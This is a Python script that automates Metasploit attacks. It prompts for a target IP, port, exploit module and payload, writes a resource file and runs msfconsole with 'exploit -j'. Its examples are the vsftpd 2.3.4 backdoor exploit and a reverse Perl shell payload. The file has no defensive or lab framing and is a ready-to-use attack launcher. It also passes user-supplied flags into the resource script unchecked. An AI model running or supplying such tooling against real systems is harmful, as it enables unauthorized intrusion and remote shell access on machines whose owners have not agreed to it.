import shutil
import subprocess
import logging
import os

def run_exploit(target_ip, rport, exploit_module=None, payload=None, flags=None):
    """
    Run customizable Metasploit exploit with user-defined options.
    
    Args:
        target_ip (str): Target IP address.
        rport (int): Remote port to target.
        exploit_module (str): Metasploit exploit module (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor').
        payload (str): Metasploit payload (e.g., 'payload/unix/reverse_perl').
        flags (str): Additional Metasploit flags (optional).
    """
    
    exploit_module = exploit_module or input("Enter exploit module (e.g., exploit/unix/ftp/vsftpd_234_backdoor): ")
    payload = payload or input("Enter payload (e.g., payload/unix/reverse_perl): ")
    
    # Check if msfconsole is installed before proceeding
    if not shutil.which("msfconsole"):
        print("Error: Metasploit (msfconsole) is not installed on this system.")
        logging.error("Metasploit not installed.")
        return
    
    # Generate the Metasploit resource script
    rc_file = 'exploit.rc'
    with open(rc_file, 'w') as file:
        file.write(f"use {exploit_module}\n")
        file.write(f"set RHOST {target_ip}\n")
        file.write(f"set RPORT {rport}\n")
        file.write(f"set PAYLOAD {payload}\n")
        if flags:
            file.write(f"{flags}\n")
        file.write("exploit -j\n")

    try:
        command = ['msfconsole', '-r', rc_file]
        print(f"Running exploit: {exploit_module} with payload: {payload} on {target_ip}:{rport}")
        
        # Capture both stdout and stderr for logging
        result = subprocess.run(command, capture_output=True, text=True, timeout=1200)
        
        # Log both stdout and stderr
        logging.info(f"Exploit results (stdout): {result.stdout}")
        logging.error(f"Exploit errors (stderr): {result.stderr}")
        
        # Show results in console
        print(result.stdout)
        if result.stderr:
            print("Errors during execution:", result.stderr)

    except subprocess.TimeoutExpired:
        print(f"Exploit with {exploit_module} on {target_ip} timed out.")
        logging.error(f"Exploit on {target_ip}:{rport} timed out.")
    except FileNotFoundError as e:
        print(f"Error: {e}. Ensure Metasploit is properly installed.")
        logging.error(f"File not found error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
        logging.error(f"Exploit failed with error: {e}")
    finally:
        # Clean up the resource script after execution
        if os.path.exists(rc_file):
            os.remove(rc_file)

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    rport = int(input("Enter the target port: "))
    
    exploit_module = input("Enter exploit module (optional): ") or None
    payload = input("Enter payload (optional): ") or None
    flags = input("Enter additional Metasploit flags (optional): ") or None

    run_exploit(target_ip, rport, exploit_module, payload, flags)

